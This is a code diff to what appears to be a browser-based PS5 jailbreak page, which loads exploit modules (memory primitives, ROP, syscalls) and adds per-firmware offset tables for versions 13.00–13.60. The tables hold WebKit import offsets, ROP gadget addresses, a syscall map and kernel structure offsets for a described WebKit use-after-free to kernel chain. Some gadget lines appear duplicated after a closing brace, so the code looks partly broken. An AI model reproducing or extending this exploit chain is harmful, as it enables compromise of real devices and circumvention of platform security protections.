@@ -102,10 +102,10 @@ let SYS;
 
 async function loadExploitModules() {
     try {
-        const modInt64 = await import('./slopkit-main/slopkit/int64.js?v=final');
+        const modInt64 = await import('./slopkit-main/slopkit/int64.js');
         int64 = modInt64.int64;
         
-        const modCore = await import('./slopkit-main/slopkit/core.js?v=final');
+        const modCore = await import('./slopkit-main/slopkit/core.js');
         establishPrimitive = modCore.establishPrimitive;
         releaseFakeCell = modCore.releaseFakeCell;
         fakeCellReleased = modCore.fakeCellReleased;
@@ -117,7 +117,7 @@ async function loadExploitModules() {
         plausibleAddress = modCore.plausibleAddress;
         plausibleCell = modCore.plausibleCell;
         
-        const modMem = await import('./slopkit-main/slopkit/mem.js?v=final');
+        const modMem = await import('./slopkit-main/slopkit/mem.js');
         installWindowP = modMem.installWindowP;
         read1 = modMem.read1;
         read2 = modMem.read2;
@@ -132,12 +132,12 @@ async function loadExploitModules() {
         toI64 = modMem.toI64;
         addrNumber = modMem.addrNumber;
         
-        const modRop = await import('./slopkit-main/slopkit/rop.js?v=final');
+        const modRop = await import('./slopkit-main/slopkit/rop.js');
         rop = modRop.rop;
         worker_rop = modRop.worker_rop;
         thread_rop = modRop.thread_rop;
         
-        const modSyscalls = await import('./slopkit-main/slopkit/syscalls.js?v=final');
+        const modSyscalls = await import('./slopkit-main/slopkit/syscalls.js');
         SYS = modSyscalls.SYS;
         
         exploitModulesLoaded = true;
@@ -148,7 +148,7 @@ async function loadExploitModules() {
     }
 }
 
-loadExploitModules();
+// loadExploitModules() will be called after DOM elements are ready
 
 const OFFSETS_URL = "offsets/offsets.json";
 const DEFAULT_LISTENER_PORT = "9026";
@@ -192,6 +192,7 @@ let exploitState = {
 };
 
 function log(line, cls = "") {
+    if (!logEl) return;
     const div = document.createElement("div");
     div.className = "log-line " + cls;
     div.textContent = "[" + new Date().toLocaleTimeString() + "] " + line;
@@ -357,14 +358,44 @@ document.addEventListener("keydown", function (e) { if (e.key === "Escape" && pa
 
 try { if (localStorage.getItem("ps5_jailbroken") === "1") { isJailbroken = true; cat.className = "ok"; jailbreak.textContent = "JAILBROKEN"; jailbreak.classList.add("disabled"); msg.textContent = "Previously jailbroken (persisted). Click PAYLOADS."; updateStageBadge("complete"); updatePayloadsUI(); } } catch (e) {}
 
+// Load exploit modules after DOM and log() are ready
+loadExploitModules();
+
 // ============================================================
 // INLINE EXPLOIT CHAIN: WebKit UAF -> ROP -> elfldr -> kstuff
 // ============================================================
 
-const OFFSET_13_60 = {
-    wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-    wk_memset_import: 0x3350850,
-    wk_stack_chk_guard_import: 0x334E198,
+// Per-firmware offsets for 13.x series (kernel offsets are same across 13.20-13.60)
+const FIRMWARE_OFFSETS = {
+    "13.00": {
+        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
+        wk_memset_import: 0x3350850,
+        wk_stack_chk_guard_import: 0x334E198,
+    },
+    "13.20": {
+        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
+        wk_memset_import: 0x3354850,
+        wk_stack_chk_guard_import: 0x3352198,
+    },
+    "13.40": {
+        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
+        wk_memset_import: 0x3350850,
+        wk_stack_chk_guard_import: 0x334E198,
+    },
+    "13.42": {
+        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
+        wk_memset_import: 0x3350850,
+        wk_stack_chk_guard_import: 0x334E198,
+    },
+    "13.60": {
+        wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
+        wk_memset_import: 0x3350850,
+        wk_stack_chk_guard_import: 0x334E198,
+    }
+};
+
+// Shared offsets (same across 13.20-13.60)
+const COMMON_OFFSETS = {
     lk_stack_chk_guard: 0x751D0,
     lk_pthread_create_name_np: 0x21890,
     lk_pthread_join: 0x229A0,
@@ -397,6 +428,39 @@ const OFFSET_13_60 = {
         "ret": 0xC7, "pop rdi": 0x288B2, "pop rsi": 0x1EE7A, "pop rdx": 0xFA7A2,
         "pop rcx": 0x80597, "pop rax": 0x3C98E, "pop rsp": 0xA1138,
         "pop r8": 0x8CE7C, "pop r9": 0x80596, "mov [rdi], rsi": 0xC05B6,
+        "mov [rdi], rax": 0x3881F, "mov [rdi], eax": 0x38820,
+        "mov rax, [rax]": 0x6FD92, "add rax, rcx": 0x319FE4,
+        "cmp [rcx], eax": 0x1C4EC65, "inc dword [rax]": 0x295B95,
+        "seta al": 0x388A2, "setb al": 0x1F006, "sete al": 0x40E7,
+        "setg al": 0x1036946, "setl al": 0x31DF00,
+        "shl rax, 3": 0x1C5B743, "shl rax, 4": 0xD16072,
+        "shr rax, 3": 0xD08FE1, "shr rax, 4": 0x1ADC233,
+        "infloop": 0x1553D
+    },
+    syscall_map: {
+        0x3: 0x1BB1A, 0x4: 0x1D520, 0x5: 0x1B6E0, 0x6: 0x1B640, 0x7: 0x1BCE0,
+        0x14: 0x1B860, 0x61: 0x1C9F0, 0x14B: 0x1D560, 0x1C6: 0x1BC60,
+        0x1C7: 0x1D180, 0x1D2: 0x1D5C0, 0x1E7: 0x1C550, 0x1E8: 0x1BF00,
+        0x2AF: 0x1D100, 0x278: 0x1B500, 0x279: 0x1D790
+    },
+    // Kernel offsets (same across 13.20-13.60)
+    KERNEL_STACK_COOKIE: 0x930,
+    KERNEL_STACK_SYS_SCHED_YIELD_RET: 0x808,
+    KERNEL_DATA: 0xCB0000,
+    KERNEL_SYS_SCHED_YIELD_RET: 0x63AC62,
+    KERNEL_ALLPROC: 0x3589E80,
+    KERNEL_SECURITY_FLAGS: 0x1A49064,
+    KERNEL_TARGETID: 0x1A4906D,
+    KERNEL_QA_FLAGS: 0x1A49088,
+    KERNEL_UTOKEN_FLAGS: 0x1A490F0,
+    KERNEL_ROOTVNODE: 0x3DE7510,
+    KERNEL_BUS_DATA_DEVICES: 0x2D481E8
+};
+
+function getOffsetsForFirmware(fwStr) {
+    const fwOffsets = FIRMWARE_OFFSETS[fwStr] || FIRMWARE_OFFSETS["13.60"];
+    return { ...COMMON_OFFSETS, ...fwOffsets };
+}
         "mov [rdi], rax": 0x3881F, "mov [rdi], eax": 0x38820,
         "mov rax, [rax]": 0x6FD92, "add rax, rcx": 0x319FE4,
         "cmp [rcx], eax": 0x1C4EC65, "inc dword [rax]": 0x295B95,
@@ -459,7 +523,8 @@ function initROP() {
     const p = exploitState.p;
     if (!p) throw new Error("No primitive");
     const fwStr = fw || "13.60";
-    const offsets = OFFSET_13_60;
+    const offsets = getOffsetsForFirmware(fwStr);
+    log(`Using offsets for firmware ${fwStr}`, "log-info");
 
     let textArea = document.createElement("textarea");
     let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
